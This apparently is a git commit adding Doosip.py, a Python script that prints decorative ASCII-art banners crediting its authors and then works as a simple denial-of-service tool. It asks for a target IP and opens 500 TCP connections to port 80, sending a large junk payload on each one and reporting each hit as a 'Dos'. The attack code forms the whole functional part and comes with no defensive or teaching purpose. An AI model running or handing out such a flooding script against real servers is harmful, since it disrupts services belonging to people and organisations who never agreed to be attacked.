58687d585257a80d88a9f30c07134996ca1fdb90
Jmeel <46560046+Jmeel@users.noreply.github.com>
2019-05-25 01:42:06 +0300

    Add files via upload

---
+++ Doosip.py
@@ -0,0 +1,75 @@
+BB = "\033[34;1m" # Blue light
+YY = "\033[33;1m" # Yellow light
+GG = "\033[32;1m" # Green light
+WW = "\033[0;1m"  # White light
+RR = "\033[31;1m" # Red light
+CC = "\033[36;1m" # Cyan light
+B = "\033[34m"    # Blue
+Y = "\033[33m"    # Yellow
+G = "\033[32m"    # Green
+W = "\033[0m"     # White
+R = "\033[31m"    # Red
+C = "\033[36m"    # Cyan
+print("")
+print("")
+print(R+"               \ Imad Ghali♥Jmeel Ahmad /                ")
+print(G+"")
+print(Y+"           lll")
+print(BB+"           lll")
+print(W+"           lll ")
+print(C+"      lll  lll         llllllll)")
+print(B+"      lll  lll  _______lll")
+print(GG+"lllllllll  llllll````llllllllll)      ")
+print(RR+"               \llllll/ ")
+print(YY+"    ++++++++++++++++++++++++++")
+print(GG+"         By Jmeel Ahmad ")
+print("         By lmad Ghali ")
+print("")
+print("    ##    ##   ##      ##           ##    ##  ")
+print("   ##    ##     ##    ##           ##    ##  ")
+print("  ########       ##  ##            ########   ")
+print("  ##    ##         ##             ##     ##")
+print("  ##    ##        ## ##           ##     ##   ")
+print("  ########       ##   ##          #########   ")
+print(" ##    ##       ##     ##        ##     ##")
+print(" ##    ##########       ##########      ##")
+
+
+
+print("#############################################")
+print("##   $$$$$           $$$$$          $$$$   ##   ")
+print("##   $$   $$      $$       $$     $$    $$ ##")
+print("##   $$    $$    $$         $$    $$       ##")
+print("##   $$    $$    $$         $$     $$      ## ")
+print("##   $$    $$    $$         $$       $$    ##")
+print("##   $$   $$      $$       $$          $$  ##")
+print("##   $$$$$           $$$$$   O   $$    $$  ##  ")
+print("##                                 $$$$    ##")
+print("#############################################")
+print("##             Enter Al ip                 ##")
+print("##############             ##################")
+print("            ################")
+import socket
+print("")
+ip=input("Enter ip : ");print("Doos in",ip)
+for h in range(500):
+  try:
+      knig=socket.socket(socket.AF_INET,socket.SOCK_STREAM)      
+      socket.setdefaulttimeout(1)
+      Jmeel=knig.connect((ip,80))
+      data="knig123djdjchdjchcndidj$+$-*:%+$-¿¿¿el"*7000
+      data=data.encode("utf-8")
+      knig.send(data)      
+      print('[√√√] Dos in ip',YY,ip,'Dos [√√√] in',C,'port [80]')
+
+
+  except :
+    print(R+"no Doos in ip ",ip)
+#   print(C+"                     no problem in the ip",YY,ip)
+
+      
+
+
+
+
+
